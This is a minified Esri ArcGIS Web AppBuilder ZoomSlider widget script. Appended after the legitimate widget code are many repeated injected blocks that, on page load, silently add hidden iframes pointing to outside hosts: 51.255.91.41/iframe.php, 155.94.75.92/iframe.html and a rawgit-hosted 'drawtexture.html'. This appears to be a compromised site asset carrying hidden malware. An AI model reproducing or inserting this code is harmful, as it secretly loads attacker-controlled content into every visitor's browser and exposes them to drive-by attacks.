// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/ZoomSlider/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/ZoomSlider/Widget.html":'\x3cdiv class\x3d"jimu-corner-all"\x3e\r\n  \x3cdiv class\x3d"zoom zoom-in" data-dojo-attach-point\x3d"btnZoomIn"\r\n   data-dojo-attach-event\x3d"onclick:_onBtnZoomInClicked"\x3e+\x3c/div\x3e\r\n  \x3cdiv class\x3d"zoom zoom-out" data-dojo-attach-point\x3d"btnZoomOut"\r\n   data-dojo-attach-event\x3d"onclick:_onBtnZoomOutClicked"\x3e\u2013\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/ZoomSlider/css/style.css":".jimu-widget-zoomslider{background-color: #ccc; background-color: rgba(0, 0, 0, 0.2); cursor: pointer; font-size: 24px; line-height: 25px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; color: #fff; text-align: center; font-family: verdana,helvetica;}.jimu-widget-zoomslider .zoom{width: 30px; height: 30px;}.jimu-widget-zoomslider .zoom:hover{background-color: #848385; background-color: rgba(0,0,0,0.4);}.jimu-widget-zoomslider .zoom.jimu-state-disabled{color: #ddd;}.jimu-widget-zoomslider.vertical .zoom-in{border-bottom: 1px solid #57585A;}.jimu-widget-zoomslider.horizontal .zoom-in{border-right: 1px solid #57585A;}",
"*now":function(d){d(['dojo/i18n!*preload*widgets/ZoomSlider/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define(["dojo/_base/declare","dojo/_base/lang","jimu/BaseWidget","dojo/_base/html","dojo/on"],function(d,e,f,a,g){return d([f],{name:"ZoomSlider",baseClass:"jimu-widget-zoomslider",_disabledClass:"jimu-state-disabled",_verticalClass:"vertical",_horizontalClass:"horizontal",_floatClass:"jimu-float-leading",_cornerTop:"jimu-corner-top",_cornerBottom:"jimu-corner-bottom",_cornerLeading:"jimu-corner-leading",_cornerTrailing:"jimu-corner-trailing",moveTopOnActive:!1,postCreate:function(){this.inherited(arguments);
this.own(g(this.map,"zoom-end",e.hitch(this,this._zoomHandler)));this._zoomHandler();this.btnZoomIn.title=window.jimuNls.common.zoomIn;this.btnZoomOut.title=window.jimuNls.common.zoomOut},setPosition:function(a){this.inherited(arguments);"number"===typeof a.height&&30>=a.height?this._setOrientation(!1):this._setOrientation(!0)},_zoomHandler:function(){a.removeClass(this.btnZoomIn,this._disabledClass);a.removeClass(this.btnZoomOut,this._disabledClass);var b=this.map.getLevel(),c=null;-1<b&&(b===this.map.getMaxZoom()?
c=this.btnZoomIn:b===this.map.getMinZoom()&&(c=this.btnZoomOut));c&&a.addClass(c,this._disabledClass)},_onBtnZoomInClicked:function(){this.map._extentUtil({numLevels:1})},_onBtnZoomOutClicked:function(){this.map._extentUtil({numLevels:-1})},_setOrientation:function(b){a.removeClass(this.domNode,this._horizontalClass);a.removeClass(this.domNode,this._verticalClass);a.removeClass(this.btnZoomIn,this._floatClass);a.removeClass(this.btnZoomIn,this._cornerTop);a.removeClass(this.btnZoomIn,this._cornerLeading);
a.removeClass(this.btnZoomOut,this._floatClass);a.removeClass(this.btnZoomOut,this._cornerBottom);a.removeClass(this.btnZoomOut,this._cornerTrailing);b?(a.addClass(this.domNode,this._verticalClass),a.addClass(this.btnZoomIn,this._cornerTop),a.addClass(this.btnZoomOut,this._cornerBottom)):(a.addClass(this.domNode,this._horizontalClass),a.addClass(this.btnZoomIn,this._floatClass),a.addClass(this.btnZoomOut,this._floatClass),a.addClass(this.btnZoomIn,this._cornerLeading),a.addClass(this.btnZoomOut,this._cornerTrailing))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});